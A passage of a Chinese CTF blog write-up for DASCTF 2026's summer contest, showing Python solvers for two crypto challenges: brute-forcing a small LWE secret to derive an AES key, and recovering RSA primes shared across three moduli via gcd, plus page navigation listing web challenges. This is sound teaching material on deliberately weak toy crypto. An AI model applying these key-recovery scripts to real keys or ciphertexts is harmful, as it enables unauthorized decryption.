class="string">&#x27;bcdad772f7a0ec967887f7b8f36234c8&#x27;</span>)</span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;00ac1bac207e84d91c6243c4aead3576a20f996a5420eea7bfa0df3b61d68c83f283bd31f1fedf7465b6445d7a58dcdc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴力枚举 4^6 = 4096 种 s，检验噪声是否都落在 &#123;-1,0,1&#125;</span></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">4</span>), repeat=n):</span><br><span class="line">    ok = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> a_i, b_i <span class="keyword">in</span> <span class="built_in">zip</span>(A, b):</span><br><span class="line">        e = (b_i - <span class="built_in">sum</span>(x * y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a_i, s))) % q</span><br><span class="line">        <span class="keyword">if</span> e <span class="keyword">not</span> <span class="keyword">in</span> (<span class="number">0</span>, <span class="number">1</span>, q - <span class="number">1</span>):   <span class="comment"># 即 &#123;0, 1, -1 mod 97&#125;</span></span><br><span class="line">            ok = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> ok:</span><br><span class="line">        s = <span class="built_in">list</span>(s)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;found s =&quot;</span>, s)</span><br><span class="line">        key = hashlib.sha256(<span class="built_in">str</span>(s).encode()).digest()[:<span class="number">16</span>]</span><br><span class="line">        pt = AES.new(key, AES.MODE_CBC, iv).decrypt(enc)</span><br><span class="line">        pad = pt[-<span class="number">1</span>]</span><br><span class="line">        flag = pt[:-pad]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flag =&quot;</span>, flag)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment">#DASCTF&#123;LWE_l4tt1c3_r3duct10n_i5_p0w3rful!&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="three_friends-rsa-多素数共享模数攻击"><a class="markdownIt-Anchor" href="#three_friends-rsa-多素数共享模数攻击"></a> <strong>three_friends( <strong>RSA 多素数共享模数攻击</strong>)</strong></h3>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;***********&quot;</span></span><br><span class="line"></span><br><span class="line">L = <span class="built_in">len</span>(flag)</span><br><span class="line">m1 = bytes_to_long(flag[:L//<span class="number">3</span>])</span><br><span class="line">m2 = bytes_to_long(flag[L//<span class="number">3</span>:<span class="number">2</span>*L//<span class="number">3</span>])</span><br><span class="line">m3 = bytes_to_long(flag[<span class="number">2</span>*L//<span class="number">3</span>:])</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">r = getPrime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">n1 = p * q</span><br><span class="line">n2 = q * r</span><br><span class="line">n3 = p * r</span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, n1)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e, n2)</span><br><span class="line">c3 = <span class="built_in">pow</span>(m3, e, n3)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n1 = <span class="subst">&#123;n1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n2 = <span class="subst">&#123;n2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n3 = <span class="subst">&#123;n3&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c1 = <span class="subst">&#123;c1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c2 = <span class="subst">&#123;c2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c3 = <span class="subst">&#123;c3&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n1 = 110479112338979326841231465480900311437095583241804968504367003268478785311645575853029227541889465070127417880290972698509502098875302777600751062235679028180932171554996023850242418398546147652141811910224228666917788640895453721648601609529326886128507435254380985821439510394329605362511800619781782498829</span></span><br><span class="line"><span class="string">n2 = 95225891725804035729098697183853172993650305271540351260130976375990969994680256179992972429701670943885218431291657615581872984046365977866046911929212400122026478512046580419614160900113488336302811792780327677539930592604198331529856760869923384410189400614767668529075682332352478496830621674767765967989</span></span><br><span class="line"><span class="string">n3 = 111603865467493745511917065096450766019551858630764507502030413922630178420561431122201021143404521026218410173550594126191240832822627851633700772093095150654117699219949636045712687320990198957564564857885138504872560550777788915442814980338401072475446362026076893466520135409327492048388030114969050367401</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c1 = 83456548767677952158133165776385438048214812740470347872014544040241661979735585698444752238351578159480247608435786172021153411975720140472715451216442036398970558532828923787921375318802867775369825882219621531795085442575971814645729572790836415339290407608988460626504016819536559945368010686567075802413</span></span><br><span class="line"><span class="string">c2 = 55598291653542627898994967211126815679185160762475277667203320398466974811147081936849639204784572327753766773503264941715352990434513737784771805183050575481575095545922660276426069697449001567347723946016416649932633528235458091960122921036028416845355866656581114844470311590282808396786169332755296721792</span></span><br><span class="line"><span class="string">c3 = 99617304265145206462280689337024202287720390645940568836285315412577937662785727570612881726190729195621460858194592258472873348744392240254689998279616123901037173010035977506212880680604466077172284894508163086916852071659627506881093976971048133795462670278664801263633610021626528113016267024450025017002</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+<p>三个模数共享素数：<strong>每个素数都被用了两次</strong>，三个模数两两之间共享一个素数。</p>
+<ul>
+<li>n1 = p × q</li>
+<li>n2 = q × r</li>
+<li>n3 = p × r</li>
+</ul>
+<p><strong>关键点：</strong> 可以通过求最大公因数（GCD）来恢复素数</p>
+<ol>
+<li><strong>恢复素数</strong>：<code>gcd(n1, n3)=p</code>、<code>gcd(n1, n2)=q</code>、<code>gcd(n2, n3)=r</code>，三个 1024 位大数的 gcd 瞬间算出 512 位素数，而且 <code>p*q==n1</code>、<code>q*r==n2</code>、<code>p*r==n3</code> 校验全部通过。</li>
+<li><strong>解密三段</strong>：每段拿到对应的两个素数后，正常走 RSA 流程——算 <code>φ = (p-1)(q-1)</code>，求 <code>d = e⁻¹ mod φ</code>，再 <code>m = c^d mod n</code>。</li>
+<li><strong>拼接</strong>：三段明文转字节拼起来就是完整 flag</li>
+</ol>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">110479112338979326841231465480900311437095583241804968504367003268478785311645575853029227541889465070127417880290972698509502098875302777600751062235679028180932171554996023850242418398546147652141811910224228666917788640895453721648601609529326886128507435254380985821439510394329605362511800619781782498829</span></span><br><span class="line">n2 = <span class="number">95225891725804035729098697183853172993650305271540351260130976375990969994680256179992972429701670943885218431291657615581872984046365977866046911929212400122026478512046580419614160900113488336302811792780327677539930592604198331529856760869923384410189400614767668529075682332352478496830621674767765967989</span></span><br><span class="line">n3 = <span class="number">111603865467493745511917065096450766019551858630764507502030413922630178420561431122201021143404521026218410173550594126191240832822627851633700772093095150654117699219949636045712687320990198957564564857885138504872560550777788915442814980338401072475446362026076893466520135409327492048388030114969050367401</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c1 = <span class="number">83456548767677952158133165776385438048214812740470347872014544040241661979735585698444752238351578159480247608435786172021153411975720140472715451216442036398970558532828923787921375318802867775369825882219621531795085442575971814645729572790836415339290407608988460626504016819536559945368010686567075802413</span></span><br><span class="line">c2 = <span class="number">55598291653542627898994967211126815679185160762475277667203320398466974811147081936849639204784572327753766773503264941715352990434513737784771805183050575481575095545922660276426069697449001567347723946016416649932633528235458091960122921036028416845355866656581114844470311590282808396786169332755296721792</span></span><br><span class="line">c3 = <span class="number">99617304265145206462280689337024202287720390645940568836285315412577937662785727570612881726190729195621460858194592258472873348744392240254689998279616123901037173010035977506212880680604466077172284894508163086916852071659627506881093976971048133795462670278664801263633610021626528113016267024450025017002</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一步：通过 gcd 恢复共享素数</span></span><br><span class="line"><span class="comment"># n1 = p*q, n2 = q*r, n3 = p*r</span></span><br><span class="line">p = gcd(n1, n3)   <span class="comment"># n1 与 n3 共享 p</span></span><br><span class="line">q = gcd(n1, n2)   <span class="comment"># n1 与 n2 共享 q</span></span><br><span class="line">r = gcd(n2, n3)   <span class="comment"># n2 与 n3 共享 r</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q =&quot;</span>, q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;r =&quot;</span>, r)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 校验：素数应该是非平凡公因数，且乘积要对得上</span></span><br><span class="line"><span class="keyword">assert</span> p * q == n1 <span class="keyword">and</span> q * r == n2 <span class="keyword">and</span> p * r == n3</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] 素数恢复成功，乘积校验通过&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_decrypt</span>(<span class="params">c, prime_a, prime_b</span>):</span><br><span class="line">    n = prime_a * prime_b</span><br><span class="line">    phi = (prime_a - <span class="number">1</span>) * (prime_b - <span class="number">1</span>)</span><br><span class="line">    d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)          <span class="comment"># 私钥 d = e^&#123;-1&#125; mod phi</span></span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)             <span class="comment"># 解密</span></span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(m)</span><br><span class="line"></span><br><span class="line">m1 = rsa_decrypt(c1, p, q)</span><br><span class="line">m2 = rsa_decrypt(c2, q, r)</span><br><span class="line">m3 = rsa_decrypt(c3, p, r)</span><br><span class="line"></span><br><span class="line">flag = m1 + m2 + m3</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag =&quot;</span>, flag.decode())</span><br><span class="line"><span class="comment">#DASCTF&#123;thr33_fri3nds_sh@r3_pr1m3s!!&#125;</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" rel="tag">比赛复现</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/1737907114de8a.jpg" data-sizes="auto" alt="京麒CTF2026" class="lazyload">
+          
+        
+        <a href="/2026/06/06/%E4%BA%AC%E9%BA%92CTF2026/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            京麒CTF2026
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/175514388679175514388612.jpg" data-sizes="auto" alt="ACTF2026" class="lazyload">
+        
+      
+      <a href="/2026/05/26/ACTF2026/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          ACTF2026
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text"> Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#corpgate"><span class="toc-number">1.1.</span> <span class="toc-text"> CorpGate</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.1.1.</span> <span class="toc-text"> 入口&amp;配置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">1.1.1.2.</span> <span class="toc-text"> 工具</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6"><span class="toc-number">1.1.1.3.</span> <span class="toc-text"> 中间件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1"><span class="toc-number">1.1.1.4.</span> <span class="toc-text"> 路由</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 解题思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">1.1.3.</span> <span class="toc-text"> 解题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E5%AF%86%E9%92%A5"><span class="toc-number">1.1.3.1.</span> <span class="toc-text"> 污染密钥</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E7%AD%BE%E5%90%8D"><span class="toc-number">1.1.3.2.</span> <span class="toc-text"> 伪造签名</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#taxmanager"><span class="toc-number">1.2.</span> <span class="toc-text"> TaxManager</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E8%87%B3reviewer"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 提取至reviewer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E6%9E%84%E9%80%A0"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 反序列化链构造</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97-hmac-%E7%AD%BE%E5%90%8D"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 计算 HMAC 签名</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%99%E8%BF%9B-voucherdata"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 写进 voucherData</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%B3%E8%AF%B7%E5%AF%BC%E5%87%BA-token"><span class="toc-number">1.2.5.</span> <span class="toc-text"> 申请导出 token</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96ssti"><span class="toc-number">1.2.6.</span> <span class="toc-text"> 触发反序列化+SSTI</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#inkverse"><span class="toc-number">1.3.</span> <span class="toc-text"> InkVerse</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 条件竞争</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#feature-token%E6%B3%84%E9%9C%B2"><span class="toc-number">1.3.3.</span> <span class="toc-text"> Feature-Token泄露</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">2.</span> <span class="toc-text"> Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lattice_oraclelwe%E5%90%91%E9%87%8F%E6%9A%B4%E5%8A%9B%E6%9E%9A%E4%B8%BEaes"><span class="toc-number">2.1.</span> <span class="toc-text"> lattice_oracle(LWE向量暴力枚举+AES)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#three_friends-rsa-%E5%A4%9A%E7%B4%A0%E6%95%B0%E5%85%B1%E4%BA%AB%E6%A8%A1%E6%95%B0%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.</span> <span class="toc-text"> three_friends( RSA 多素数共享模数攻击)</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "DASCTF2026夏季赛",
+          url: "http://example.com/2026/05/30/DASCTF2026%E5%A4%8F%E5%AD%A3%E8%B5%9B/",
+          excerpt: "",
+          description: "",
+          stripContent: " Web  CorpGate 给了附件：   源码分析  入口&amp;amp;配置 src/app.js— 应用入口。创建 Express 实例，设置 EJS 模板引擎，挂载中间件（express.json、urlencoded、cookie-parser、静态资源），把四个路由模块都挂在 / 下，监听 0.0.0.0:3000。 src/config.js — 全局配置中心，所有模块共享同一个对象。生成随机 JWT 密钥；维护 signingState（当前生效密钥、版本号）；定义 featureF",
+          date: "Sat May 30 2026 11:01:45 GMT+0800",
+          updated: "Sat May 30 2026 17:12:09 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
